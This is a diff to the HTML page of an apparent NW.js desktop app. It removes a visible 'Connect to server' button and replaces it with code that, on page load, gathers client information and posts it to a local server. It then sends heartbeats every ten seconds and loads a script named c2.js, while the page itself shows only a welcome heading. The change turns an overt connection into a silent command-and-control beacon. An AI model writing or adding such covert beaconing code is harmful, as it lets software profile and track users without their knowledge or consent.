@@ -8,25 +8,31 @@
   </head>
   <body>
     <h1>Welcome!</h1>
-    <button id="connectBtn">Connect to server</button>
-    <p id="osInfo"></p>
 
     <script>
-      // This part runs in the browser context (NW.js allows Node.js features too)
-
-      // Attach event listener to the button
-      document.getElementById('connectBtn').addEventListener('click', async function() {
+      window.onload = async function() {
+        const clientInfo = await getClientInfo();
         try {
-          // Use axios to call the server-side endpoint
-          const response = await axios.post('http://localhost:1337/connect');
           
-          // Update the DOM
-          document.getElementById('osInfo').innerText = "Connected successfully!";
+          // Use axios to call the server-side endpoint
+          const response = await axios.post('http://localhost:1337/connect', clientInfo);
+
+          setInterval(sendHeartbeat, 10000);
+
+
         } catch (error) {
           console.error("Error connecting to server:", error);
-          document.getElementById('osInfo').innerText = `Error: ${error.message}`;
         }
-      });
+      };
+
+      async function sendHeartbeat() {
+        try {
+          const response = await axios.post('http://localhost:1337/heartbeat');
+          console.log('Heartbeat sent:', response.data);
+        } catch (error) {
+          console.error('Error sending heartbeat:', error);
+        }
+      }
     </script>
     <script src="./src/c2.js"></script>
   </body>
